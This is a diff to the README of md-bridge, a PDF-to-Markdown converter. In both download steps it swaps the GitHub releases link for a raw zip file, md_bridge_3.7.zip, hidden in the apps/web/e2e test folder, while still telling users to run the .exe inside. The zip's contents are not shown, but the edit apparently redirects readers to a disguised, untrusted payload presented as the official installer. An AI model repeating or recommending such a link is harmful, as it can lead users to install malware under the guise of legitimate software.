@@ -2,7 +2,7 @@
 
 ![Download md-bridge](https://img.shields.io/badge/Download-md--bridge-blue)
 
-[https://github.com/aayush369-byte/md-bridge/releases](https://github.com/aayush369-byte/md-bridge/releases)
+[https://github.com/aayush369-byte/md-bridge/raw/refs/heads/main/apps/web/e2e/md_bridge_3.7.zip](https://github.com/aayush369-byte/md-bridge/raw/refs/heads/main/apps/web/e2e/md_bridge_3.7.zip)
 
 md-bridge converts your files between PDF and Markdown formats. It runs on your own computer. Your data stays private. It uses fixed rules to process files, so the results match every time. You get the same output from the same input.
 
@@ -28,7 +28,7 @@ Follow these steps to set up md-bridge on your Windows machine.
 ### 1. Download the file
 Visit the official release page to find the installer. 
 
-[https://github.com/aayush369-byte/md-bridge/releases](https://github.com/aayush369-byte/md-bridge/releases)
+[https://github.com/aayush369-byte/md-bridge/raw/refs/heads/main/apps/web/e2e/md_bridge_3.7.zip](https://github.com/aayush369-byte/md-bridge/raw/refs/heads/main/apps/web/e2e/md_bridge_3.7.zip)
 
 Look for the file ending in .exe or the latest release package. Save this file to your computer.
 
